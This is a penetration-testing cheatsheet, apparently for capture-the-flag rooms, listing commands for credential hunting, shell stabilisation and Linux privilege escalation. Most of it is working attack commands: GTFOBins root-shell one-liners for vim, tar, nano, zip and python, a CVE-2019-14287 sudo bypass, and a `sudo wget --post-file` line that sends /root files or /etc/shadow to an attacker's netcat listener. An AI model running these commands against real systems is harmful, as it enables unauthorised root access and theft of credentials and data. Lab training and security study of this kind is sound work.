# Pentest Cheatsheet

Standard commands and common procedures.
**Custom commands in this repo** → [COMMAND.md](COMMAND.md)

## Search

### Find files

#### By filename

```bash
find / -type f -name "user.txt" 2>/dev/null
```

#### By string

```bash
grep -R "flag" .
```

Faster:

```bash
rg "flag"
```

## Privilege escalation prep

### Users

#### Login-capable users

```bash
grep -vE '(nologin|false)$' /etc/passwd
```

#### All usernames

```bash
cut -d: -f1 /etc/passwd
```

### Passwords and creds (after Linux shell)

Room-specific paths → `cases/<name>/MEMO.md`.

#### First places to check

| Type | Examples |
|------|----------|
| Config / history | `~/.bash_history`, `~/.mysql_history`, `~/.ssh/id_rsa` |
| Web / DB | `/var/www/`, `wp-config.php`, `.env`, `config.php` |
| Backups | `*.bak`, `*.old`, `*~`, forgotten archive extracts |
| Logs | `/var/log/`, app debug logs |
| Shared / temp | `/tmp`, `/opt`, `*.txt` / `*.cfg` in root |

```bash
# world-writable files (upload hints)
find / -writable -type f 2>/dev/null | grep -v '/proc\|/sys' | head -50

# recently modified
find / -type f -mtime -1 2>/dev/null | head -50
```

#### By name / extension

```bash
find / -type f \( \
  -iname '*.pcap' -o -iname '*.pcapng' -o \
  -iname '*.log' -o -iname '*.conf' -o -iname '*.config' -o \
  -iname '*password*' -o -iname '*cred*' -o -iname '*.env' \
\) 2>/dev/null
```

#### Quick content grep

```bash
grep -riE 'password|passwd|pass=|pwd=|secret' /var/www /home /opt 2>/dev/null | head -30
strings <file> | less
grep -a password <file>
```

#### Packet captures

Plaintext protocols (FTP, HTTP Basic, Telnet, etc.) or `su` / `ssh` attempts may appear.

```bash
file capture.pcapng
strings capture.pcapng | less
# on Kali: wireshark / tshark -r capture.pcapng
#   filters: ftp / http / tcp.port==22
#   Follow → TCP Stream
```

#### Captured hashes

When `/etc/shadow` is unreadable, hunt app DB dumps or john/hashcat inputs.
Container automation → [COMMAND.md](COMMAND.md) (`sshkey-crack`, `hydrassh`, etc.).

## Shell stabilization (pty upgrade)

Without a PTY you often get:

- No tab completion / arrow keys
- `Ctrl+C` kills the whole shell
- Broken `sudo`, `vim`, `su`
- Duplicated output

**1. Target** — spawn a PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# no python3: python -c '...' / script -q /dev/null -c bash
```

`tty` should show `/dev/pts/N`.

**2. Kali** — foreground and match terminal mode

`Ctrl+Z`, then:

```bash
stty raw -echo; fg
```

Press **Enter** twice.

**3. Target** — terminal size and TERM

```bash
export TERM=xterm-256color
stty rows 50 columns 120
```

Match Kali:

```bash
stty size    # e.g. 50 120 → rows columns
```

**No python**

```bash
script -q /dev/null -c bash
# or
/usr/bin/script -qc /dev/bash /dev/null
```

**Troubleshooting**

| Symptom | Fix |
|---------|-----|
| no `python3` | try `python` / `script` |
| `stty: invalid argument` | re-check `stty size` on Kali |
| broken newlines | redo step 2 (`Ctrl+Z` → `stty raw -echo; fg`) |
| disconnect | before upgrade: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin` |

## Privilege escalation

### SUID binaries

```bash
find / -perm -4000 2>/dev/null
```

### sudo -l

Run early after getting a shell:

```bash
sudo -l
```

### wget (sudo NOPASSWD) — exfil file contents

When `sudo -l` shows `(root) NOPASSWD: /usr/bin/wget`, read arbitrary files as root and POST them (GTFOBins).

**Kali (listener)**

```bash
listen 80
# or: nc -lvnp 80
```

**Target (sender)**

```bash
# LHOST = Kali IP visible from target (THM: ip a → tun0)
sudo /usr/bin/wget --post-file=/root/root_flag.txt <LHOST>
```

`<LHOST>` is **your Kali** IP. The listener receives **file contents**.

- Paths must be guessed/enumerated (`user_flag.txt` → `/root/root_flag.txt`, etc.)
- Also works: `--post-file=/etc/shadow`, `--post-file=/etc/passwd`
- Main use: **exfil**, not interactive root shell

### SUID files (detailed)

```bash
find / -perm -u=s -type f 2>/dev/null -exec ls -la {} \;
```

### python privesc

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### vim privesc

```bash
sudo vim -c ':!/bin/sh'
```

When `sudo -l` allows editing **specific files only** (e.g. `(ALL, !root) NOPASSWD: /usr/bin/vi /path/to/allowed-file`):

```bash
# plain sudo vi may be denied as root
sudo -u <user> /usr/bin/vi /path/to/allowed-file
```

In vi (**one command at a time**):

```vim
:set shell=/bin/bash
:shell
```

Or:

```vim
:!/bin/bash
```

- `-u <user>` does **not** give root (`:e /root/root.txt` → Permission denied)
- For root → CVE-2019-14287 below

### sudo `(ALL, !root)` — CVE-2019-14287

`(ALL, !root) NOPASSWD: ...` blocks explicit `-u root`. Old sudo (&lt; 1.8.28) treats **`-u#-1` as uid 0**.

```bash
sudo -u#-1 /usr/bin/vi /path/to/allowed-file
```

In vi:

```vim
:!/bin/bash
```

```bash
id                  # uid=0(root)
cat /root/root.txt
```

One-liner:

```bash
sudo -u#-1 /usr/bin/vi -c ':!/bin/bash' /path/to/allowed-file
```

Equivalent:

```bash
sudo -u#4294967295 /usr/bin/vi /path/to/allowed-file
```

| Command | Result |
|---------|--------|
| `sudo vi ...` | run as root → **denied** |
| `sudo -u <user> vi ...` | as user → **no root files** |
| `sudo -u#-1 vi ...` | **root bypass** |

- Paths must **match `sudo -l` exactly**
- Refs: [GTFOBins vi](https://gtfobins.github.io/gtfobins/vi/), [CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)

### tar privesc

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### nano privesc

```bash
sudo /bin/nano -s /bin/sh /dev/null
```

## steghide (manual)

```bash
steghide info <path>
stegcracker <path> $RECON_PASSLIST
steghide extract -sf <path> -p '<pass>'
```

Automated → [COMMAND.md](COMMAND.md) `steg-extract` (alias: `stegx`).

## Broken file headers (magic bytes)

```bash
fixmagic broken.png
fixmagic -n image.png
```

## SUID-owned writable file

```bash
FILE_PATH=shell.sh
chmod u+wx $FILE_PATH
cat > $FILE_PATH <<'EOF'
#!/bin/bash
/bin/bash
EOF
sudo $FILE_PATH
```

## zip privesc

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/passwd -T -TT 'sh #'
```
